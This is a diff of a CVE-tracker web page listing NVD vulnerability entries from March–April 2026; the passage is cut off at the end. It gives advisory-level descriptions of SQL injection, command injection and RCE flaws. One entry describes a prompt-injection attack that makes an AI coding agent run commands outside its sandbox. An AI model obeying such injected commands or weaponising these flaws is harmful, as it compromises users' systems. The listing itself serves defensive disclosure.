@@ -11,7 +11,7 @@
     <header>
       <h1>vuln-tracker</h1>
       <p class="subtitle">CVEs from the National Vulnerability Database — current and previous month</p>
-      <p class="last-updated">Last updated: 2026-04-16 17:21 UTC</p>
+      <p class="last-updated">Last updated: 2026-04-16 19:23 UTC</p>
     </header>
     <nav>
       <a href="top50.html">&#9733; Top 50</a>
@@ -25,7 +25,7 @@
     </nav>
     <main>
     <section>
-      <h2>Current Month — April 2026 <span class="count">(2978)</span></h2>
+      <h2>Current Month — April 2026 <span class="count">(2995)</span></h2>
       <div class="table-wrapper">
         <table>
           <thead>
@@ -42,6 +42,160 @@
             </tr>
           </thead>
           <tbody>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-6442" target="_blank" rel="noopener">CVE-2026-6442</a></td>
+        <td>8.3</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-1286</td>
+        <td>&nbsp;</td>
+        <td>&mdash;</td>
+        <td>5.81</td>
+        <td><details><summary>Improper validation of bash commands in Snowflake Cortex Code CLI versions prior...</summary><p>Improper validation of bash commands in Snowflake Cortex Code CLI versions prior to 1.0.25 allowed subsequent commands to execute outside the sandbox. An attacker could exploit this by embedding specially crafted commands in untrusted content, such as a malicious repository, causing the CLI agent to execute arbitrary code on the local device without user consent. Exploitation is non-deterministic and model-dependent. The fix is automatically applied upon relaunch with no user action required.</p></details></td>
+        <td>2026-04-16</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33121" target="_blank" rel="noopener">CVE-2026-33121</a></td>
+        <td>8.7</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-89</td>
+        <td>&nbsp;</td>
+        <td>&mdash;</td>
+        <td>6.09</td>
+        <td><details><summary>DataEase is an open-source data visualization and analytics platform. Versions 2...</summary><p>DataEase is an open-source data visualization and analytics platform. Versions 2.10.20 and below contain a SQL injection vulnerability in the API datasource saving process. The deTableName field from the Base64-encoded datasource configuration is used to construct a DDL statement via simple string replacement without any sanitization or escaping of the table name. An authenticated attacker can inject arbitrary SQL commands by crafting a deTableName that breaks out of identifier quoting, enabling error-based SQL injection that can extract database information such as the MySQL version. This issue has been fixed in version 2.10.21.</p></details></td>
+        <td>2026-04-16</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33084" target="_blank" rel="noopener">CVE-2026-33084</a></td>
+        <td>8.7</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-89</td>
+        <td>&nbsp;</td>
+        <td>&mdash;</td>
+        <td>6.09</td>
+        <td><details><summary>DataEase is an open-source data visualization and analytics platform. Versions 2...</summary><p>DataEase is an open-source data visualization and analytics platform. Versions 2.10.20 and below contain a SQL injection vulnerability in the sort parameter of the /de2api/datasetData/enumValueObj endpoint. The DatasetDataManage service layer directly transfers the user-supplied sort value to the sorting metadata DTO, which is passed to Order2SQLObj where it is incorporated into the SQL ORDER BY clause without any whitelist validation, and then executed via CalciteProvider. An authenticated attacker can inject arbitrary SQL commands through the sort parameter, enabling time-based blind SQL injection. This issue has been fixed in version 2.10.21.</p></details></td>
+        <td>2026-04-16</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-54510" target="_blank" rel="noopener">CVE-2025-54510</a></td>
+        <td>5.9</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-414</td>
+        <td>&nbsp;</td>
+        <td>&mdash;</td>
+        <td>4.13</td>
+        <td><details><summary>Missing lock check in AMD Platform Security Processor in AMD EPYC™ 9005 Series C...</summary><p>Missing lock check in AMD Platform Security Processor in AMD EPYC™ 9005 Series CPUs allows a privileged attacker to potentially impact guest confidentiality via local access.</p></details></td>
+        <td>2026-04-16</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-43937" target="_blank" rel="noopener">CVE-2025-43937</a></td>
+        <td>6.6</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-532</td>
+        <td>&nbsp;</td>
+        <td>&mdash;</td>
+        <td>4.62</td>
+        <td><details><summary>Dell PowerScale OneFS, versions prior to 9.12.0.0, contains an insertion of sens...</summary><p>Dell PowerScale OneFS, versions prior to 9.12.0.0, contains an insertion of sensitive information into log file vulnerability. A low privileged attacker with local access could potentially exploit this vulnerability, leading to the disclosure of certain user credentials. The attacker may be able to use the exposed credentials to access the vulnerable application with privileges of the compromised account.</p></details></td>
+        <td>2026-04-16</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-43935" target="_blank" rel="noopener">CVE-2025-43935</a></td>
+        <td>4.4</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-404</td>
+        <td>&nbsp;</td>
+        <td>&mdash;</td>
+        <td>3.08</td>
+        <td><details><summary>Dell PowerScale OneFS, versions prior to 9.12.0.0, contains an improper resource...</summary><p>Dell PowerScale OneFS, versions prior to 9.12.0.0, contains an improper resource shutdown or release vulnerability. A high privileged attacker with local access could potentially exploit this vulnerability, leading to denial of service.</p></details></td>
+        <td>2026-04-16</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-20585" target="_blank" rel="noopener">CVE-2023-20585</a></td>
+        <td>5.6</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-788</td>
+        <td>&nbsp;</td>
+        <td>&mdash;</td>
+        <td>3.92</td>
+        <td><details><summary>Insuffient checks of the RMP on host buffer access in IOMMU may allow an attacke...</summary><p>Insuffient checks of the RMP on host buffer access in IOMMU may allow an attacker with privileges and a compromised HV to trigger an out of bounds condition without RMP checks resulting in a potential loss of confidential guest integrity.</p></details></td>
+        <td>2026-04-16</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-41082" target="_blank" rel="noopener">CVE-2026-41082</a></td>
+        <td>7.3</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-24</td>
+        <td>&nbsp;</td>
+        <td>&mdash;</td>
+        <td>5.11</td>
+        <td><details><summary>In OCaml opam before 2.5.1, a .install field containing a destination filepath c...</summary><p>In OCaml opam before 2.5.1, a .install field containing a destination filepath can use ../ to reach a parent directory.</p></details></td>
+        <td>2026-04-16</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33083" target="_blank" rel="noopener">CVE-2026-33083</a></td>
+        <td>8.7</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-89</td>
+        <td>&nbsp;</td>
+        <td>&mdash;</td>
+        <td>6.09</td>
+        <td><details><summary>DataEase is an open-source data visualization and analytics platform. Versions 2...</summary><p>DataEase is an open-source data visualization and analytics platform. Versions 2.10.20 and below contain a SQL injection vulnerability in the orderDirection parameter used in dataset-related endpoints including /de2api/datasetData/enumValueDs and /de2api/datasetTree/exportDataset. The Order2SQLObj class directly assigns the raw user-supplied orderDirection value into the SQL query without any validation or whitelist enforcement, and the value is rendered into the ORDER BY clause via StringTemplate before being executed against the database. An authenticated attacker can inject arbitrary SQL commands through the sorting direction field, enabling time-based blind data extraction and denial of service. This issue has been fixed in version 2.10.21.</p></details></td>
+        <td>2026-04-16</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33082" target="_blank" rel="noopener">CVE-2026-33082</a></td>
+        <td>8.7</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-89</td>
+        <td>&nbsp;</td>
+        <td>&mdash;</td>
+        <td>6.09</td>
+        <td><details><summary>DataEase is an open source data visualization analysis tool. Versions 2.10.20 an...</summary><p>DataEase is an open source data visualization analysis tool. Versions 2.10.20 and below contain a SQL injection vulnerability in the dataset export functionality. The expressionTree parameter in POST /de2api/datasetTree/exportDataset is deserialized into a filtering object and passed to WhereTree2Str.transFilterTrees for SQL translation, where user-controlled values in &quot;like&quot; filter terms are directly concatenated into SQL fragments without sanitization. An attacker can inject arbitrary SQL commands by escaping the string literal in the filter value, enabling blind SQL injection through techniques such as time-based extraction of database information. This issue has been fixed in version 2.10.21.</p></details></td>
+        <td>2026-04-16</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-2336" target="_blank" rel="noopener">CVE-2026-2336</a></td>
+        <td>8.7</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-331</td>
+        <td>&nbsp;</td>
+        <td>&mdash;</td>
+        <td>6.09</td>
+        <td><details><summary>A privilege escalation vulnerability in Microchip IStaX allows an authenticated ...</summary><p>A privilege escalation vulnerability in Microchip IStaX allows an authenticated low-privileged user to recover a shared per-device cookie secret from their own webstax_auth session cookie and forge a new cookie with administrative privileges.This issue affects IStaX before 2026.03.</p></details></td>
+        <td>2026-04-16</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27820" target="_blank" rel="noopener">CVE-2026-27820</a></td>
+        <td>1.7</td>
+        <td><span class="severity low">LOW</span></td>
+        <td>CWE-120</td>
+        <td>&nbsp;</td>
+        <td>&mdash;</td>
+        <td>1.19</td>
+        <td><details><summary>zlib is a Ruby interface for the zlib compression/decompression library. Version...</summary><p>zlib is a Ruby interface for the zlib compression/decompression library. Versions 3.0.0 and below, 3.1.0, 3.1.1, 3.2.0 and 3.2.1 contain a buffer overflow vulnerability in the Zlib::GzipReader. The zstream_buffer_ungets function prepends caller-provided bytes ahead of previously produced output but fails to guarantee the backing Ruby string has enough capacity before the memmove shifts the existing data. This can lead to memory corruption when the buffer length exceeds capacity. This issue has been fixed in versions 3.0.1, 3.1.2 and 3.2.3.</p></details></td>
+        <td>2026-04-16</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-24749" target="_blank" rel="noopener">CVE-2026-24749</a></td>
+        <td>5.3</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-863</td>
+        <td>&nbsp;</td>
+        <td>&mdash;</td>
+        <td>3.71</td>
+        <td><details><summary>The Silverstripe Assets Module is a required component of Silverstripe Framework...</summary><p>The Silverstripe Assets Module is a required component of Silverstripe Framework. In versions prior to 2.4.5 and 3.0.0-rc1 through 3.1.2, images rendered in templates or otherwise accessed via DBFile::getURL() or DBFile::getSourceURL() incorrectly add an access grant to the current session, which bypasses file permissions. This usually happens when creating an image variant, for example using a manipulation method like ScaleWidth() or Convert(). Note that if developers use DBFile directly in the $db configuration for a DataObject class that doesn&#x27;t subclass File, and if they were setting the visibility of those files to &quot;protected&quot;, those files will now need an explicit access grant to be accessed. If developers do not want to explicitly provide access grants for these files in their apps (i.e. they want these files to be accessible by default), they should use the &quot;public&quot; visibility. This issue has been fixed in versions 2.4.5 and 3.1.3.</p></details></td>
+        <td>2026-04-16</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-43883" target="_blank" rel="noopener">CVE-2025-43883</a></td>
+        <td>4.1</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-754</td>
+        <td>&nbsp;</td>
+        <td>&mdash;</td>
+        <td>2.87</td>
+        <td><details><summary>Dell PowerScale OneFS, versions prior to 9.12.0.0, contains an improper check fo...</summary><p>Dell PowerScale OneFS, versions prior to 9.12.0.0, contains an improper check for unusual or exceptional conditions vulnerability. A high privileged attacker with local access could potentially exploit this vulnerability, leading to denial of service.</p></details></td>
+        <td>2026-04-16</td>
+      </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-5426" target="_blank" rel="noopener">CVE-2026-5426</a></td>
         <td>0.0</td>
@@ -198,23 +352,23 @@
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-37337" target="_blank" rel="noopener">CVE-2026-37337</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>7.3</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-89</td>
         <td>&nbsp;</td>
         <td>&mdash;</td>
-        <td>0.00</td>
+        <td>5.11</td>
         <td><details><summary>SourceCodester Simple Music Cloud Community System v1.0 is vulnerable to SQL Inj...</summary><p>SourceCodester Simple Music Cloud Community System v1.0 is vulnerable to SQL Injection in the file /music/view_playlist.php.</p></details></td>
         <td>2026-04-16</td>
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-37336" target="_blank" rel="noopener">CVE-2026-37336</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>7.3</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-89</td>
         <td>&nbsp;</td>
         <td>&mdash;</td>
-        <td>0.00</td>
+        <td>5.11</td>
         <td><details><summary>SourceCodester Simple Music Cloud Community System v1.0 is vulnerable to SQL Inj...</summary><p>SourceCodester Simple Music Cloud Community System v1.0 is vulnerable to SQL Injection in the file /music/view_music.php.</p></details></td>
         <td>2026-04-16</td>
       </tr>
@@ -231,12 +385,12 @@
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30656" target="_blank" rel="noopener">CVE-2026-30656</a></td>
-        <td>0.0</td>
-        <td><span class="severity none">NONE</span></td>
-        <td>N/A</td>
+        <td>7.5</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-476</td>
         <td>&nbsp;</td>
         <td>&mdash;</td>
-        <td>0.00</td>
+        <td>5.25</td>
         <td><details><summary>A NULL pointer dereference vulnerability exists in fio (Flexible I/O Tester) v3....</summary><p>A NULL pointer dereference vulnerability exists in fio (Flexible I/O Tester) v3.41 when parsing job files containing the fdp_pli option. The callback function str_fdp_pli_cb() does not validate the input pointer and calls strdup() on a NULL value when the option is specified without an argument. This results in a segmentation fault and process crash.</p></details></td>
         <td>2026-04-16</td>
       </tr>
@@ -7925,7 +8079,7 @@ Users are recommended to upgrade to version 3.2.0, which fixes this issue.</p></
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-21014" target="_blank" rel="noopener">CVE-2026-21014</a></td>
         <td>5.1</td>
         <td><span class="severity medium">MEDIUM</span></td>
-        <td>N/A</td>
+        <td>NVD-CWE-noinfo</td>
         <td>&nbsp;</td>
         <td>0.0% <small>p2</small></td>
         <td>3.57</td>
@@ -7936,7 +8090,7 @@ Users are recommended to upgrade to version 3.2.0, which fixes this issue.</p></
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-21013" target="_blank" rel="noopener">CVE-2026-21013</a></td>
         <td>6.9</td>
         <td><span class="severity medium">MEDIUM</span></td>
-        <td>N/A</td>
+        <td>CWE-276</td>
         <td>&nbsp;</td>
         <td>0.0% <small>p2</small></td>
         <td>4.83</td>
@@ -8145,7 +8299,7 @@ Users are recommended to upgrade to version 3.2.0, which fixes this issue.</p></
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-21003" target="_blank" rel="noopener">CVE-2026-21003</a></td>
         <td>5.2</td>
         <td><span class="severity medium">MEDIUM</span></td>
-        <td>N/A</td>
+        <td>NVD-CWE-noinfo</td>
         <td>&nbsp;</td>
         <td>0.0% <small>p13</small></td>
         <td>3.64</td>
@@ -9276,12 +9430,12 @@ Users are recommended to upgrade to version 3.2.0, which fixes this issue.</p></
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-40175" target="_blank" rel="noopener">CVE-2026-40175</a></td>
-        <td>10.0</td>
-        <td><span class="severity critical">CRITICAL</span></td>
+        <td>4.8</td>
+        <td><span class="severity medium">MEDIUM</span></td>
         <td>CWE-113</td>
         <td>&nbsp;</td>
         <td>0.5% <small>p67</small></td>
-        <td>7.02</td>
+        <td>3.38</td>
         <td><details><summary>Axios is a promise based HTTP client for the browser and Node.js. Prior to 1.15....</summary><p>Axios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.0 and 0.3.1, the Axios library is vulnerable to a specific &quot;Gadget&quot; attack chain that allows Prototype Pollution in any third-party dependency to be escalated into Remote Code Execution (RCE) or Full Cloud Compromise (via AWS IMDSv2 bypass). This vulnerability is fixed in 1.15.0 and 0.3.1.</p></details></td>
         <td>2026-04-10</td>
       </tr>
@@ -12003,6 +12157,33 @@ Users are recommended to upgrade to version 3.2.0, which fixes this issue.</p></
         <td>2026-04-09</td>
       </tr>
       <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33797" target="_blank" rel="noopener">CVE-2026-33797</a></td>
+        <td>7.1</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-20</td>
+        <td>&nbsp;</td>
+        <td>0.0% <small>p6</small></td>
+        <td>4.97</td>
+        <td><details><summary>An Improper Input Validation vulnerability in Juniper Networks Junos OS and Juno...</summary><p>An Improper Input Validation vulnerability in Juniper Networks Junos OS and Junos OS Evolved allows an unauthenticated, adjacent attacker, sending a specific genuine BGP packet in an already established BGP session to reset only that session causing a Denial of Service (DoS).
+
+An attacker repeatedly sending the packet will sustain the Denial of Service (DoS).This issue affects Junos OS:
+
+  *  25.2 versions before 25.2R2
+
+
+This issue doesn&#x27;t not affected Junos OS versions before 25.2R1.
+
+This issue affects Junos OS Evolved: 
+  *  25.2-EVO versions before 25.2R2-EVO
+
+
+This issue doesn&#x27;t not affected Junos OS Evolved versions before 25.2R1-EVO.
+
+eBGP and iBGP are affected.
+IPv4 and IPv6 are affected.</p></details></td>
+        <td>2026-04-09</td>
+      </tr>
+      <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33793" target="_blank" rel="noopener">CVE-2026-33793</a></td>
         <td>8.5</td>
         <td><span class="severity high">HIGH</span></td>
@@ -12034,6 +12215,77 @@ Junos OS Evolved: 
   *  from 23.4 before 23.4R2-S6-EVO,
   *  from 24.2 before 24.2R2-EVO, 
   *  from 24.4 before 24.4R1-S1-EVO, 24.4R2-EVO.</p></details></td>
+        <td>2026-04-09</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33791" target="_blank" rel="noopener">CVE-2026-33791</a></td>
+        <td>8.4</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-78</td>
+        <td>&nbsp;</td>
+        <td>0.1% <small>p18</small></td>
+        <td>5.88</td>
+        <td><details><summary>An OS Command Injection vulnerability in the CLI processing of Juniper Networks ...</summary><p>An OS Command Injection vulnerability in the CLI processing of Juniper Networks Junos OS and Junos OS Evolved allows a local, high-privileged attacker executing specific, crafted CLI commands to inject arbitrary shell commands as root, leading to a complete compromise of the system.
+
+Certain &#x27;set system&#x27; commands, when executed with crafted arguments, are not properly sanitized, allowing for arbitrary shell injection. These shell commands are executed as root, potentially allowing for complete control of the vulnerable system.
+This issue affects:
+
+Junos OS: 
+
+
+
+  *  all versions before 22.4R3-S8, 
+  *  from 23.2 before 23.2R2-S5, 
+  *  from 23.4 before 23.4R2-S7, 
+  *  from 24.2 before 24.2R2-S2, 
+  *  from 24.4 before 24.4R2, 
+  *  from 25.2 before 25.2R2; 
+
+
+
+
+Junos OS Evolved: 
+
+
+
+  *  all versions before 22.4R3-S8-EVO, 
+  *  from 23.2 before 23.2R2-S5-EVO, 
+  *  from 23.4 before 23.4R2-S7-EVO, 
+  *  from 24.2 before 24.2R2-S2-EVO, 
+  *  from 24.4 before 24.4R2-EVO, 
+  *  from 25.2 before 25.2R1-S1-EVO, 25.2R2-EVO.</p></details></td>
+        <td>2026-04-09</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33776" target="_blank" rel="noopener">CVE-2026-33776</a></td>
+        <td>6.8</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-862</td>
+        <td>&nbsp;</td>
+        <td>0.0% <small>p1</small></td>
+        <td>4.76</td>
+        <td><details><summary>A Missing Authorization vulnerability in the CLI of Juniper Networks Junos OS an...</summary><p>A Missing Authorization vulnerability in the CLI of Juniper Networks Junos OS and Junos OS Evolved allows a local user with low privileges to read sensitive information.
+
+A local user with low privileges can execute the CLI command &#x27;show mgd&#x27; with specific arguments which will expose sensitive information.
+
+This issue affects
+
+Junos OS:
+  *  all versions before 22.4R3-S8,
+  *  23.2 versions before 23.2R2-S6,
+  *  23.4 versions before 23.4R2-S6,
+  *  24.2 versions before 24.2R2-S4,
+  *  24.4 versions before 24.4R2-S1,
+  *  25.2 version before 25.2R1-S2, 25.2R2;
+
+
+
+Junos OS Evolved:
+  *  all versions before 23.2R2-S6-EVO,
+  *  23.4 version before 23.4R2-S6-EVO,
+  *  24.2 version before 24.2R2-S4-EVO,
+  *  24.4 versions before 24.4R2-S1-EVO,
+  *  25.2 versions before 25.2R2-EVO.</p></details></td>
         <td>2026-04-09</td>
       </tr>
       <tr>
@@ -13303,12 +13555,12 @@ Junos OS Evolved: 
       </tr>
       <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-62718" target="_blank" rel="noopener">CVE-2025-62718</a></td>
-        <td>9.3</td>
-        <td><span class="severity critical">CRITICAL</span></td>
+        <td>6.3</td>
+        <td><span class="severity medium">MEDIUM</span></td>
         <td>CWE-441</td>
         <td>&nbsp;</td>
         <td>0.0% <small>p9</small></td>
-        <td>6.51</td>
+        <td>4.41</td>
         <td><details><summary>Axios is a promise based HTTP client for the browser and Node.js. Prior to 1.15....</summary><p>Axios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.0 and 0.31.0, Axios does not correctly handle hostname normalization when checking NO_PROXY rules. Requests to loopback addresses like localhost. (with a trailing dot) or [::1] (IPv6 literal) skip NO_PROXY matching and go through the configured proxy. This goes against what developers expect and lets attackers force requests through a proxy, even if NO_PROXY is set up to protect loopback or internal services. This issue leads to the possibility of proxy bypass and SSRF vulnerabilities allowing attackers to reach sensitive loopback or internal services despite the configured protections. This vulnerability is fixed in 1.15.0 and 0.31.0.</p></details></td>
         <td>2026-04-09</td>
       </tr>
@@ -18981,7 +19233,7 @@ Junos OS Evolved: 
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32289" target="_blank" rel="noopener">CVE-2026-32289</a></td>
         <td>6.1</td>
         <td><span class="severity medium">MEDIUM</span></td>
-        <td>N/A</td>
+        <td>CWE-79</td>
         <td>&nbsp;</td>
         <td>0.0% <small>p2</small></td>
         <td>4.27</td>
@@ -18992,7 +19244,7 @@ Junos OS Evolved: 
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32288" target="_blank" rel="noopener">CVE-2026-32288</a></td>
         <td>5.5</td>
         <td><span class="severity medium">MEDIUM</span></td>
-        <td>N/A</td>
+        <td>CWE-770</td>
         <td>&nbsp;</td>
         <td>0.0% <small>p0</small></td>
         <td>3.85</td>
@@ -19003,7 +19255,7 @@ Junos OS Evolved: 
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32283" target="_blank" rel="noopener">CVE-2026-32283</a></td>
         <td>7.5</td>
         <td><span class="severity high">HIGH</span></td>
-        <td>N/A</td>
+        <td>CWE-770</td>
         <td>&nbsp;</td>
         <td>0.0% <small>p5</small></td>
         <td>5.25</td>
@@ -19014,7 +19266,7 @@ Junos OS Evolved: 
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32282" target="_blank" rel="noopener">CVE-2026-32282</a></td>
         <td>6.4</td>
         <td><span class="severity medium">MEDIUM</span></td>
-        <td>N/A</td>
+        <td>CWE-59</td>
         <td>&nbsp;</td>
         <td>0.0% <small>p0</small></td>
         <td>4.48</td>
@@ -19025,7 +19277,7 @@ Junos OS Evolved: 
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-32281" target="_blank" rel="noopener">CVE-2026-32281</a></td>
         <td>7.5</td>
         <td><span class="severity high">HIGH</span></td>
-        <td>N/A</td>
+        <td>CWE-295</td>
         <td>&nbsp;</td>
         <td>0.0% <small>p5</small></td>
         <td>5.25</td>
@@ -19047,7 +19299,7 @@ Junos OS Evolved: 
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27144" target="_blank" rel="noopener">CVE-2026-27144</a></td>
         <td>7.1</td>
         <td><span class="severity high">HIGH</span></td>
-        <td>N/A</td>
+        <td>CWE-843</td>
         <td>&nbsp;</td>
         <td>0.0% <small>p0</small></td>
         <td>4.97</td>
@@ -19058,7 +19310,7 @@ Junos OS Evolved: 
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27143" target="_blank" rel="noopener">CVE-2026-27143</a></td>
         <td>9.8</td>
         <td><span class="severity critical">CRITICAL</span></td>
-        <td>N/A</td>
+        <td>NVD-CWE-Other</td>
         <td>&nbsp;</td>
         <td>0.0% <small>p6</small></td>
         <td>6.86</td>
@@ -21758,6 +22010,31 @@ Junos OS Evolved: 
         <td>0.0% <small>p4</small></td>
         <td>5.25</td>
         <td><details><summary>Cross-Site Request Forgery (CSRF) vulnerability in Analytify Under Construction,...</summary><p>Cross-Site Request Forgery (CSRF) vulnerability in Analytify Under Construction, Coming Soon &amp; Maintenance Mode allows Cross Site Request Forgery.This issue affects Under Construction, Coming Soon &amp; Maintenance Mode: from n/a through 2.1.1.</p></details></td>
+        <td>2026-04-07</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34197" target="_blank" rel="noopener">CVE-2026-34197</a></td>
+        <td>8.8</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-20</td>
+        <td><span class="kev-yes">&#10003;</span></td>
+        <td>6.2% <small>p90</small></td>
+        <td>6.35</td>
+        <td><details><summary>Improper Input Validation, Improper Control of Generation of Code (&#x27;Code Injecti...</summary><p>Improper Input Validation, Improper Control of Generation of Code (&#x27;Code Injection&#x27;) vulnerability in Apache ActiveMQ Broker, Apache ActiveMQ.
+
+Apache ActiveMQ Classic exposes the Jolokia JMX-HTTP bridge at /api/jolokia/ on the web console. The default Jolokia access policy permits exec operations on all ActiveMQ MBeans (org.apache.activemq:*), including
+BrokerService.addNetworkConnector(String) and BrokerService.addConnector(String).
+
+An authenticated attacker can invoke these operations with a crafted discovery URI that triggers the VM transport&#x27;s brokerConfig parameter to load a remote Spring XML application context using ResourceXmlApplicationContext.
+Because Spring&#x27;s ResourceXmlApplicationContext instantiates all singleton beans before the BrokerService validates the configuration, arbitrary code execution occurs on the broker&#x27;s JVM through bean factory methods such as Runtime.exec().
+
+
+
+This issue affects Apache ActiveMQ Broker: before 5.19.4, from 6.0.0 before 6.2.3; Apache ActiveMQ All: before 5.19.4, from 6.0.0 before 6.2.3; Apache ActiveMQ: before 5.19.4, from 6.0.0 before 6.2.3.
+
+
+
+Users are recommended to upgrade to version 5.19.4 or 6.2.3, which fixes the issue</p></details></td>
         <td>2026-04-07</td>
       </tr>
       <tr>
@@ -30253,18 +30530,6 @@ Junos OS Evolved: 
         <td>2026-04-02</td>
       </tr>
       <tr>
-        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33613" target="_blank" rel="noopener">CVE-2026-33613</a></td>
-        <td>7.2</td>
-        <td><span class="severity high">HIGH</span></td>
-        <td>CWE-78</td>
-        <td>&nbsp;</td>
-        <td>0.2% <small>p35</small></td>
-        <td>5.04</td>
-        <td><details><summary>Due to the improper neutralisation of special elements used in an OS command, a ...</summary><p>Due to the improper neutralisation of special elements used in an OS command, a remote attacker can exploit an RCE vulnerability in the generateSrpArray function, resulting in full system compromise.
-This vulnerability can only be attacked if the attacker has some other way to write arbitrary data to the user table.</p></details></td>
-        <td>2026-04-02</td>
-      </tr>
-      <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-29144" target="_blank" rel="noopener">CVE-2026-29144</a></td>
         <td>7.8</td>
         <td><span class="severity high">HIGH</span></td>
@@ -36964,22 +37229,6 @@ This vulnerability can only be attacked if the attacker has some other way to wr
         <td>2026-03-30</td>
       </tr>
       <tr>
-        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25704" target="_blank" rel="noopener">CVE-2026-25704</a></td>
-        <td>5.8</td>
-        <td><span class="severity medium">MEDIUM</span></td>
-        <td>CWE-271</td>
-        <td>&nbsp;</td>
-        <td>0.0% <small>p2</small></td>
-        <td>4.06</td>
-        <td><details><summary>A Privilege Dropping / Lowering Errors/Time-of-check Time-of-use (TOCTOU) Race C...</summary><p>A Privilege Dropping / Lowering Errors/Time-of-check Time-of-use (TOCTOU) Race Condition vulnerability in  cosmic-greeter can allow an attacker to regain privileges that should have been dropped and abuse them in the racy checking logic.
-
-
-
-
-This issue affects cosmic-greeter before https://github.Com/pop-os/cosmic-greeter/pull/426.</p></details></td>
-        <td>2026-03-30</td>
-      </tr>
-      <tr>
         <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-3716" target="_blank" rel="noopener">CVE-2025-3716</a></td>
         <td>5.3</td>
         <td><span class="severity medium">MEDIUM</span></td>
@@ -41622,6 +41871,63 @@ This issue affects cosmic-greeter before https://github.Com/pop-os/cosmic-greete
         <td>2026-03-26</td>
       </tr>
       <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4926" target="_blank" rel="noopener">CVE-2026-4926</a></td>
+        <td>7.5</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>CWE-400</td>
+        <td>&nbsp;</td>
+        <td>0.1% <small>p16</small></td>
+        <td>5.25</td>
+        <td><details><summary>Impact:
+
+A bad regular expression is generated any time you have multiple sequen...</summary><p>Impact:
+
+A bad regular expression is generated any time you have multiple sequential optional groups (curly brace syntax), such as `{a}{b}{c}:z`. The generated regex grows exponentially with the number of groups, causing denial of service.
+
